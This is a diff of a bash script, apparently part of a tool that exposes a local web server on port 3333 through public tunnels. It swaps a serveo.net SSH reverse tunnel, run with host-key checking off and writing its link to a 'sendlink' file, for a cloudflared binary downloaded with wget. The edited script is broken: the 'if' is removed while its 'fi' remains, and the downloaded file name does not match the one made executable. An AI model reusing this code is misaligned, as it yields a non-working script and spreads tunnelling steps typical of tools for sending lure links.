@@ -1,5 +1,7 @@
 #!/bin/bash
 clear
+wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64
+chmod +x cloudflared
 printf "\n"
 printf "\n"
 printf "\n"
@@ -165,8 +167,6 @@ echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   -------------------
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m   !      STARTING SERVEO      !  \e[0m'
 echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------   \e[0m'
 
-wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
-chmod +x cloudflared
 
 echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Cloudflared...\e[0m  "
 			   echo -ne "  "
@@ -177,13 +177,7 @@ echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Cloudflared...\e[0m  "
    	                 fi
 			{ sleep 2; clear; }
 
-if [[ $subdomain_resp == true ]]; then
 
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
-
-sleep 8
-else
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
 
 sleep 2
 fi
